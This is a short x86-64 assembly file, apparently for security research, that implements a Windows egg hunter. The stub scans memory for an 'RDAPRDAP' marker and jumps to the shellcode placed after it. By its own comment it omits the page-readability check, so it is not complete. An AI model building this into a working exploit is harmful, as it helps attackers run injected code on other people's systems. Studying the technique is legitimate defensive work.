; -----------------------------------------------------------------------------
; Win64 Egg Hunter Research
; A refined, non-weaponized logic for memory scanning in x86_64 environments.
; -----------------------------------------------------------------------------

bits 64

section .text
global _start

_start:
    xor rdx, rdx            ; Initialize RDX as our memory scanner pointer

next_page:
    or dx, 0xfff            ; Page alignment (aligns to 4095 bytes)

next_addr:
    inc rdx                 ; Increment to the first byte of the next page

    ; --- MEMORY VERIFICATION BLOCK ---
    ; Note: Practical implementations require SEH or Syscalls (e.g., NtAccessCheck)
    ; to verify page readability and prevent Access Violations (0xC0000005).
    ; ---------------------------------

    ; Egg signature: 'RDAP' (0x50414452) in Little Endian
    mov eax, 0x50414452     
    cmp [rdx], eax          ; Compare first 4 bytes for the EGG
    jne next_addr           ; If not found, check next address
    
    cmp [rdx+4], eax        ; Double-tagging check (prevents finding itself)
    jne next_addr           ; If second 4 bytes don't match, continue
    
    ; Success: Egg 'RDAPRDAP' located
    add rdx, 8              ; Skip the 8-byte signature to reach the payload
    jmp rdx                 ; Transfer execution to the shellcode
